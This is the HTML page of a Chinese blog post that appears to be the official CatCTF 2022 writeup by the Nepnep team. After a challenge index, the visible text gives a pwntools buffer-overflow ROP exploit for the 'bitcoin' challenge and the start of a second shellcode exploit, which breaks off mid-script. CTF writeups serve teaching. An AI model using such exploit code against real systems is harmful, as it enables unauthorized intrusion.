<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP | xia0ji233's blog</title><meta name="author" content="xia0ji233"><meta name="copyright" content="xia0ji233"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CatCTF2022 å®˜æ–¹WP">
<meta property="og:type" content="article">
<meta property="og:title" content="æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP">
<meta property="og:url" content="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/index.html">
<meta property="og:site_name" content="xia0ji233&#39;s blog">
<meta property="og:description" content="CatCTF2022 å®˜æ–¹WP">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xia0ji233.github.io/img/avatar.png">
<meta property="article:published_time" content="2023-01-01T10:00:00.000Z">
<meta property="article:modified_time" content="2024-04-09T05:23:09.884Z">
<meta property="article:author" content="xia0ji233">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xia0ji233.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-09 13:23:09'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="xia0ji233's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">283</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">107</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroud.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="xia0ji233's blog"><span class="site-name">xia0ji233's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-01-01T10:00:00.000Z" title="å‘è¡¨äº 2023-01-01 18:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-04-09T05:23:09.884Z" title="æ›´æ–°äº 2024-04-09 13:23:09">2024-04-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/writeup/">writeup</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/writeup/CatCTF2022/">CatCTF2022</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Nepnep/">Nepnep</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">35.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>180åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>CatCTF2022 å®˜æ–¹WP</p>
<span id="more"></span>

<h2 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><ul>
<li><a href="#%E6%84%9F%E8%B0%A2">æ„Ÿè°¢</a></li>
<li><a href="#%E6%8B%9B%E6%96%B0">æ‹›æ–°</a></li>
<li><a href="#PWN">PWN</a><ul>
<li><a href="#bitcoin">bitcoinğŸª™</a><ul>
<li><a href="#EXP">EXP</a></li>
<li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">éé¢„æœŸ</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">æºç </a></li>
</ul>
</li>
<li><a href="#HRPVM%EF%B8%8F">HRPVMğŸ–¥ï¸</a><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E">æ¼æ´</a></li>
<li><a href="#EXP">EXP</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">æºç </a></li>
</ul>
</li>
<li><a href="#injection20">injection2.0ğŸ’‰</a><ul>
<li><a href="#exp">exp</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">ä¸Šä¼ è„šæœ¬</a></li>
</ul>
</li>
<li><a href="#kernel-test-%E6%9C%AC%E6%AC%A1%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86%E5%8C%85%E6%8B%AC%E6%BA%90%E7%A0%81EXPdocker">kernel-test æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬</a><ul>
<li><a href="#Ret2usr">Ret2usr</a></li>
<li><a href="#%E7%AE%80%E6%98%93%E8%AE%B2%E8%A7%A3">ç®€æ˜“è®²è§£</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">æºç </a></li>
<li><a href="#%E9%87%8D%E7%82%B9">é‡ç‚¹</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">æ”»å‡»æ€è·¯</a></li>
<li><a href="#EXP">EXP</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">ä¸Šä¼ è„šæœ¬</a></li>
<li><a href="#tips">tips</a></li>
</ul>
</li>
<li><a href="#zip">zipğŸ’¼</a><ul>
<li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">éé¢„æœŸ</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">æºç </a></li>
</ul>
</li>
<li><a href="#welcome_cat_ctf">welcome_cat_ctfğŸ‰</a></li>
<li><a href="#chao-">chao ğŸŒ¿</a><ul>
<li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li>
<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90">é€†å‘åˆ†æ</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ¼æ´åˆ©ç”¨</a></li>
<li><a href="#exp">exp</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">æºç </a></li>
</ul>
</li>
<li><a href="#Cat-of-magic%EF%B8%8F">Cat of magicğŸ§™â€â™€ï¸</a><ul>
<li><a href="#exp">exp</a></li>
<li><a href="#%E5%9C%B0%E5%9B%BE">åœ°å›¾</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#WEB">WEB</a><ul>
<li><a href="#ez_js">ez_jsğŸ¦</a></li>
<li><a href="#Cat-cat">Cat catğŸ˜¼</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%B0%9D%E8%AF%95">ä¿¡æ¯æ”¶é›†ä¸å°è¯•</a></li>
<li><a href="#%E9%A2%98%E7%9B%AE%E9%A6%96%E9%A1%B5">é¢˜ç›®é¦–é¡µ</a></li>
<li><a href="#%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6">å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81">è¯»å–æºç </a></li>
<li><a href="#apppy">app.py</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">ä»£ç å®¡è®¡</a></li>
<li><a href="#%E5%AE%A1%E8%AE%A1apppy">å®¡è®¡app.py</a></li>
<li><a href="#flag%E9%83%A8%E5%88%86">flagéƒ¨åˆ†</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%83%A8%E5%88%86">æ–‡ä»¶è¯»å–éƒ¨åˆ†</a></li>
<li><a href="#%E5%AE%A1%E8%AE%A1catpy">å®¡è®¡cat.py</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8A%9F%E8%83%BD">æ–‡ä»¶è¯»å–åŠŸèƒ½</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">ä½¿ç”¨æ–¹æ³•</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98">è§£é¢˜</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96secret-key">è·å–secret key</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E5%A0%86%E6%A0%88%E5%88%86%E5%B8%83">è¯»å–å †æ ˆåˆ†å¸ƒ</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E5%AF%B9%E5%BA%94%E4%BD%8D%E7%BD%AE%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE">è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®</a></li>
<li><a href="#%E4%BC%AA%E9%80%A0session">ä¼ªé€ session</a></li>
<li><a href="#%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag">ä¸€é”®è·å–flag</a></li>
<li><a href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E">å†™åœ¨æœ€å</a></li>
</ul>
</li>
<li><a href="#ez_bypass">ez_bypassğŸ¥</a></li>
<li><a href="#ez_curl">ez_curlğŸ”—</a></li>
<li><a href="#wife">wifeğŸ’ƒ</a></li>
<li><a href="#web_challenge">web_challengeğŸ’ª</a></li>
</ul>
</li>
<li><a href="#CRYPTO">CRYPTO</a><ul>
<li><a href="#DDH_Game">DDH_Game</a><ul>
<li><a href="#%E8%A7%A3%E6%B3%95%E4%B8%80">è§£æ³•ä¸€</a></li>
<li><a href="#%E8%A7%A3%E6%B3%95%E4%BA%8C">è§£æ³•äºŒ</a></li>
<li><a href="#%E5%8A%A8%E6%9C%BA">åŠ¨æœº</a></li>
</ul>
</li>
<li><a href="#cat_theory">cat_theory</a><ul>
<li><a href="#%E9%A2%98%E8%A7%A3">é¢˜è§£</a></li>
<li><a href="#%E5%8A%A8%E6%9C%BA">åŠ¨æœº</a></li>
</ul>
</li>
<li><a href="#cats-gift">catâ€™s giftğŸ</a><ul>
<li><a href="#%E9%A2%98%E8%A7%A3">é¢˜è§£</a></li>
<li><a href="#%E5%90%8E%E8%AE%B0">åè®°</a></li>
</ul>
</li>
<li><a href="#%E7%9B%96%E8%8C%A8%E6%AF%94can-you-tell-AES-from-blackboxsampl%E5%87%BA%E9%A2%98%E4%BA%BA%E5%89%8D%E8%A8%80">ç›–èŒ¨æ¯”&amp;can you tell AES from blackboxï¼Ÿ&amp;samplå‡ºé¢˜äººå‰è¨€</a></li>
<li><a href="#%E7%9B%96%E8%8C%A8%E6%AF%94">ç›–èŒ¨æ¯”</a><ul>
<li><a href="#mtp">mtp</a></li>
<li><a href="#%E7%88%86%E7%A0%B4">çˆ†ç ´</a></li>
</ul>
</li>
<li><a href="#can-you-tell-AES-from-blackbox">can you tell AES from blackboxï¼Ÿ</a></li>
<li><a href="#sample">sample</a></li>
</ul>
</li>
<li><a href="#Reverse">Reverse</a><ul>
<li><a href="#CatFly">CatFlyğŸ›«ğŸ±</a></li>
<li><a href="#ReadingSection">ReadingSection</a></li>
<li><a href="#StupidOrangeCat2">StupidOrangeCat2
</a></li>
<li><a href="#The-cat-did-it">The cat did it</a><ul>
<li><a href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%92%8C%E8%A7%A3%E6%B3%95">è®¾è®¡æ€è·¯å’Œè§£æ³•</a></li>
<li><a href="#%E7%8C%AB%E7%8C%AB%E9%95%87%E6%A5%BC">çŒ«çŒ«é•‡æ¥¼</a></li>
</ul>
</li>
<li><a href="#BugCat">BugCat</a><ul>
<li><a href="#%E4%B8%80%E5%89%8D%E8%A8%80">ä¸€ã€å‰è¨€</a></li>
<li><a href="#%E4%BA%8C%E8%A7%A3%E9%A2%98%E6%96%B9%E6%A1%88">äºŒã€è§£é¢˜æ–¹æ¡ˆ</a></li>
<li><a href="#%E4%B8%89%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC">ä¸‰ã€è§£é¢˜è„šæœ¬</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#MISC">MISC</a><ul>
<li><a href="#catnim">catnim</a><ul>
<li><a href="#exp">exp</a></li>
</ul>
</li>
<li><a href="#miao">miao~</a></li>
<li><a href="#Peekaboo">Peekaboo</a></li>
<li><a href="#MeowMeow">MeowMeow</a></li>
<li><a href="#CatFlag">CatFlag</a></li>
<li><a href="#CatPaw">CatPaw</a><ul>
<li><a href="#1-%E6%8B%A5%E6%9C%89%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%AF%B9%E5%BA%94%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80">1. æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€</a></li>
<li><a href="#2%E5%AF%BB%E6%89%BE%E5%B0%8F%E7%B1%B3%E5%AE%89%E5%85%A8%E9%94%AE%E7%9B%98%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80">2.å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€</a></li>
<li><a href="#3%E5%90%88%E7%90%86%E7%8C%9C%E6%B5%8B">3.åˆç†çŒœæµ‹</a></li>
<li><a href="#4%E9%87%8D%E6%94%BE">4.é‡æ”¾?</a></li>
</ul>
</li>
<li><a href="#CatJump">CatJump</a><ul>
<li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li>
<li><a href="#%E5%87%BA%E9%A2%98%E7%81%B5%E6%84%9F%E6%9D%A5%E6%BA%90">å‡ºé¢˜çµæ„Ÿæ¥æº</a></li>
<li><a href="#%E6%AD%A3%E6%96%87">æ­£æ–‡</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF1">è§£é¢˜æ€è·¯1</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2">è§£é¢˜æ€è·¯2</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%E9%9D%9E%E9%A2%84%E6%9C%9F">è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰</a></li>
</ul>
</li>
<li><a href="#CatCat">CatCat</a></li>
<li><a href="#CatchCat">CatchCat</a></li>
<li><a href="#Nepnep-%E7%A5%9D%E4%BD%A0%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%E5%95%A6">Nepnep ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼
</a></li>
</ul>
</li>
</ul>
<h3 id="æ„Ÿè°¢"><a href="#æ„Ÿè°¢" class="headerlink" title="æ„Ÿè°¢"></a>æ„Ÿè°¢</h3><p>æ„Ÿè°¢Nepnepæˆ˜é˜Ÿçš„å„ä½æˆå‘˜ã€æ”»é˜²ä¸–ç•Œçš„è¿ç»´å°å“¥å“¥å°å§å§ä»¬ã€å…¬å¼€æ‹›å‹Ÿçš„å‡ºé¢˜äººå’Œå¿—æ„¿è€…ä»¬ä»¥åŠå„ä½CTFé€‰æ‰‹å¯¹æ­¤æ¬¡å…¬ç›Šæ¯”èµ›çš„æ”¯æŒï¼Œè®©ğŸ±ğŸ±ä»¬å¯ä»¥é¥±é¤ä¸€é¡¿ã€‚æœ€ç»ˆæœ¬æ¬¡æ´»åŠ¨å…±æˆåŠŸå‹Ÿé›†åˆ°1å¨çŒ«ç²®ï¼Œä»¥æ¯åªå°çŒ«æ¯é¡¿60gçŒ«ç²®æ¥è®¡ï¼Œè¶…1.6wåªæµæµªå°çŒ«å°†èƒ½é¥±é¤ä¸€é¡¿ã€‚<br>æ‹¯æ•‘å–µå–µå¤§ä½œæˆ˜è®¡åˆ’å¤§è·æˆåŠŸğŸ‘ğŸ‘</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EKiSEZk7Kj7aTZYk4hWhew">https://mp.weixin.qq.com/s/EKiSEZk7Kj7aTZYk4hWhew</a></p>
<h3 id="æ‹›æ–°"><a href="#æ‹›æ–°" class="headerlink" title="æ‹›æ–°"></a>æ‹›æ–°</h3><p>Nepnepå¤§åŠ›æ‹›æ–°ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…ä»¬å¯ä»¥æŠ•é€’ç®€å†åˆ°<a href="mailto:1764763743@qq.com" title="1764763743@qq.com">1764763743@qq.com</a>ï¼ŒæœŸå¾…å„ä½å¸ˆå‚…çš„åŠ å…¥QWQï¼</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="bitcoinğŸª™"><a href="#bitcoinğŸª™" class="headerlink" title="bitcoinğŸª™"></a>bitcoinğŸª™</h3><p>è¿™ä¸ªé¢˜æˆ‘æ²¡æœ‰å‡ºå¥½ï¼Œå½“æ—¶é˜³äº†&#x3D;-&#x3D; è„‘å­å—¡å—¡çš„ å¸Œæœ›å„ä½pwnä¸è¦ä»‹æ„</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/01DF1245_G97zrmnsPY.gif" class="">

<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">59746</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">rsi=<span class="number">0x0000000000406301</span></span><br><span class="line">cin=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">start=elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">hard=<span class="number">0x609248</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">pa=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(rdi)+p64(cin)+p64(rsi)+p64(hard)+p64(<span class="number">0</span>)+p64(use_cin)+p64(<span class="number">0x402937</span>)</span><br><span class="line">r.sendline(pa)</span><br><span class="line">r.sendline(p64(<span class="number">1</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>æˆ‘æ²™ç›’æ£€æµ‹æœºåˆ¶è®¾ç½®çš„ä¸æ˜¯å¾ˆå¥½ï¼Œmprotectè¢«åˆ©ç”¨äº†ï¼Œåˆ©ç”¨csu+shellcodeç›´æ¥æ¢­å“ˆ</p>
<p>éé¢„æœŸå‘ç°è€…ï¼ˆç¬¬ä¸€ä¸ªå’Œæˆ‘åé¦ˆçš„ä¹Ÿè®¸æœ‰åˆ«çš„å¸ˆå‚…ä¹Ÿå‘ç°äº†ï¼‰ï¼šgxh191å¸ˆå‚…</p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&quot;61.147.171.105&quot;,59746)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">rsi=<span class="number">0x0000000000406301</span></span><br><span class="line">cin=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">start=elf.sym[<span 